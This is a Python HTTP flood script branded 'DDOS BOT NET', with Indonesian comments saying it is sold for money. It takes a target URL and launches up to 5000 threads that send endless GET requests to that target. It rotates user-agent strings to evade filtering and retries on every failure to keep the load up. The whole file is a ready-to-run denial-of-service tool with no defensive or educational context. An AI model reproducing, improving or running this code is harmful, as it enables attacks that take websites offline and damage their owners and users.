#pyrhon/bin
#Creator : XhenzoSec
#Jangan di Sebar Secara Free !!
#Jual No enc 150k
#50k untuk gw

import sys
import time
import threading
import random
import requests
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from rich.console import Console
from rich.table import Table
from rich.progress import Progress
from rich.panel import Panel
from rich.text import Text
from os import system

system("clear")
console = Console()

MAX_RETRIES = 50
BACKOFF_FACTOR = 0.5
REQUEST_TIMEOUT = 10
DELAY_RANGE = (0.1, 0.3)

def create_session():
    session = requests.Session()
    retries = Retry(
        total=MAX_RETRIES,
        backoff_factor=BACKOFF_FACTOR,
        status_forcelist=[500, 502, 503, 504]
    )
    session.mount('http://', HTTPAdapter(max_retries=retries))
    session.mount('https://', HTTPAdapter(max_retries=retries))
    return session

def attack(url, thread_num):
    session = create_session()
    request_count = 0

    while True:
        try:
            time.sleep(random.uniform(*DELAY_RANGE))
            response = session.get(
                url,
                timeout=REQUEST_TIMEOUT,
                headers={'User-Agent': get_random_user_agent()}
            )
            status = response.status_code
            request_count += 1

            if status == 200:
                console.print(f"[bold red]BOTNET[/bold red][bold white]  {thread_num} - [bold magenta]KILL[/bold magenta][bold green] {request_count}: [ 200 ]")
            else:
                console.print(f"[bold red]BOTNET[/bold red][bold white]  {thread_num} - [bold magenta]KILL[/bold magenta][bold red] {request_count}: Status [ {status} ]")
        except requests.exceptions.ConnectionError:
            console.print(f"[bold red]BOTNET[/bold red] [bold yellow] {thread_num} - [red]Connection Error (Retrying...)[/red]")
        except requests.exceptions.Timeout:
            console.print(f"[bold red]BOTNET[/bold red] {thread_num} - [red]Request Timeout (Retrying...)[/red]")
            time.sleep(1)
        except Exception as e:
            console.print(f"[red]Critical Error: {str(e)} (Restarting Thread)[/red]")
            time.sleep(5)
            session = create_session()

def get_random_user_agent():
    agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
    ]
    return random.choice(agents)




def main():
    console.print(Panel(f"""[bold cyan]
[ • ] DDOS BOT NET
[ • ] DEVELOPERS : ACILL STRESER
[ • ] VERSION : 5.0
[ • ] SPEED : 500s""",style="bold red"))
    url = console.input("[bold cyan]INPUT TARGET : ").strip()
    if not url.startswith(('http://', 'https://')):
        console.print("[red]Error: URL harus dimulai dengan 'http://' atau 'https://'.[/red]")
        sys.exit(1)

    try:
        threads = int(input("[bold cyan]MASUKAN JUMLAH BOTNET ( 500 / 1000 ) : ").strip())
        if threads <= 0:
            console.print("[red]Error: Jumlah botnet harus lebih besar dari 0.[/red]")
            sys.exit(1)
    except ValueError:
        console.print("[red]Error: Jumlah botnet harus berupa angka.[/red]")
        sys.exit(1)

    console.print(Panel.fit(f"BOT NET START SEND TO {url} ON {threads} BOTNET", style="bold green"))
    console.print("[blue][!] Press CTRL+C TO STOP ATTACK[/blue]\n")
    
    MAX_THREADS = 5000
    if threads > MAX_THREADS:
        console.print(f"[yellow][!] Warning: Botnet count capped at {MAX_THREADS}[/yellow]")
        threads = MAX_THREADS

    thread_pool = []
    for i in range(threads):
        try:
            thread = threading.Thread(target=attack, args=(url, i+1))
            thread.daemon = True
            thread.start()
            thread_pool.append(thread)
        except Exception as e:
            console.print(f"[red][!] Failed to start Botnet {i+1}: {str(e)}[/red]")

    try:
        with Progress() as progress:
            task = progress.add_task("[bold green]BOT NET NEW ACTIVE ", total=threads)
            while True:
                alive_threads = sum(1 for t in thread_pool if t.is_alive())
                progress.update(task, completed=alive_threads)
                time.sleep(1)
    except KeyboardInterrupt:
        console.print("\n[red][ !] Stopping attack...[/red]")
        for thread in thread_pool:
            thread.join()
        sys.exit(0)

if __name__ == "__main__":
    main()
